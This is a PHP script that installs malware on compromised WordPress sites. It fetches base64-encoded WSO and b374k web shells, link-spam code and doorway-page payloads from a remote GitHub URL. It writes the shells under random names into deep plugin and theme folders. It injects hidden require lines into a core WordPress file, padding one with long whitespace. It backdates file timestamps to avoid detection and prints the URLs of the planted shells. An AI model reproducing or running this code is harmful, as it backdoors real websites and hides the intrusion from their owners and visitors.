$jmFileConfig = '/configuration.php';
$wpFileConfig = '/wp-config.php';

$path_jm_plugins = 'plugins';
$path_jm_components = 'components';
$path_jm_modules = 'modules';

$path_wp_1 = 'wp-content/plugins';
$path_wp_2 = 'wp-content/themes';


if (!$doorway = trim(@file_get_contents('https://raw.githubusercontent.com/dorgens/FREE583C0/master/d.js'))) {
    echo "Not Content Doorway";
    exit();
}

if (!$linksmart_joomla = trim(@file_get_contents('https://raw.githubusercontent.com/dorgens/FREE583C0/master/jm_lm.js'))) {
    echo "Not Content Joomla Link";
    exit();
}

if (!$linksmart_wordpress = trim(@file_get_contents('https://raw.githubusercontent.com/dorgens/FREE583C0/master/wp_lm.js'))) {
    echo "Not Content Wordpress Links";
    exit();
}

if (!$wso = trim(@file_get_contents('https://raw.githubusercontent.com/dorgens/FREE583C0/master/s.js'))) {
    echo "Not Content Wso";
    exit();
}

if (!$b374k = trim(@file_get_contents('https://raw.githubusercontent.com/dorgens/FREE583C0/master/s2.js'))) {
    echo "Not Content B374K";
    exit();
}

///////определяем смс
$docRoot = getcwd();
$data = stat('index.php');
$domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);



if (file_exists($docRoot . $wpFileConfig)) {
    $cms = 'wp';


} elseif (file_exists($docRoot . $jmFileConfig)) {

    $cms = 'jm';

} else {
    $cms = '0';

}

/// инсталим софт в корень
if($cms=='wp') {
    echo "Install to Wordpress  \n";
    echo "Shells \n";

//// First shell
    $shell = base64_decode($wso);
    $gener_name = generateRandomKey(5);
    $path_max = shell_install($path_wp_1);
    @file_put_contents($docRoot . '/' . $path_max . '/' . $gener_name . '.php', $shell);
    @touch($path_max . '/' . $gener_name . '.php', $data[9]);
    @touch($path_max, $data[9]);
    echo 'http://' . $domain . '/' . $path_max . '/' . $gener_name . '.php';
    echo "\n";


/////////Second shelll//////////
    $gener_name = generateRandomKey(5);
    $path_max = shell_install($path_wp_2);
    $shell = base64_decode($b374k);
    @file_put_contents($docRoot . '/' . $path_max . '/' . $gener_name . '.php', $shell);
    @touch($path_max . '/' . $gener_name . '.php', $data[9]);
    @touch($path_max, $data[9]);
    echo 'http://' . $domain . '/' . $path_max . '/' . $gener_name . '.php';
    echo "\n";

//////////Install Link ///////////
    $shell = base64_decode($linksmart_wordpress);

    @file_put_contents('wp-includes/pomo/form.php', $shell);
    if(file_exists('wp-includes/pomo/form.php')) {

        $file = 'wp-includes/pomo/mo.php';
        $tmp = file_get_contents($file);
        $text1= "@require_once dirname(__FILE__) . '/form.php';require_once dirname(__FILE__) . '/translations.php';";
        $pos = strpos($tmp,$text1);
        if(empty($pos))
        {
            $text2 = "require_once dirname(__FILE__) . '/translations.php';";
            $content = file($file);
            $content = str_replace($text2, $text1, $content);
            @file_put_contents($file,$content);
            echo "Inject Links\n";
        }else{
            echo "Not Need Inject Links\n";
        }


        echo "Links install\n";
        echo 'http://' . $domain . '/wp-includes/pomo/form.php';
        echo "\n";
    }else{
        echo "Not Install Links\n";
    }

////// Install DOORWAY////

//$doorway
@file_put_contents('wp-includes/pomo/plag.php',base64_decode($doorway));
    if(file_exists('wp-includes/pomo/plag.php')) {

        $file = 'wp-includes/pomo/mo.php';
        $tmp = file_get_contents($file);
        $text1= "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <?php @require_once dirname(__FILE__) . '/plag.php';?>";
        $pos = strpos($tmp,'plag.php');
        if(empty($pos))
        {

            @file_put_contents($file,$text1."\n".$tmp);

            echo "Inject Doorway\n";
        }else{
            echo "Not Need Inject Doorway\n";
        }


        echo "Doorway install\n";
        echo 'http://' . $domain . '/wp-includes/pomo/plag.php';
        echo "\n";
        echo "Doorway Map\n";
        echo 'http://' . $domain . '/mapss.php';
        echo "\n";
    }else{
        echo "Not Install Doorway\n";

    }


    @touch('wp-includes/pomo/plag.php', $data[9]);
    @touch('wp-includes/', $data[9]);
    @touch('wp-includes/pomo/form.php', $data[9]);
    @touch('wp-includes/pomo/mo.php', $data[9]);
    @touch('wp-includes/pomo/', $data[9]);

}
















//////////////////functions///////////////////////
function get_floders($path = '')
{
    $dir_paths = array();
    foreach (glob($path . "/*", GLOB_ONLYDIR) as $filename)
    {
        $dir_paths[] = $filename;
        $a = glob("$filename/*", GLOB_ONLYDIR);
        if( is_array( $a ) )
        {
            $b = get_floders( "$filename/*" );
            foreach( $b as $c )
            {
                $dir_paths[] = $c;
            }
        }
    }
    return $dir_paths;
}

function generateRandomKey($length)
{
    $code = "";
    $values = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

    for ($i = 0; $i < $length; $i++) {
        $code .= $values[rand(0, 61)];
    }
    return $code;
}


function shell_install($path_shell)
{
    $max =0;
    foreach(get_floders($path_shell) as $floder){

        $coun = substr_count($floder,'/');

        if($coun >$max)
        {
            $max=$coun;

            $path_max = $floder;
        }

    }
    return $path_max;
}
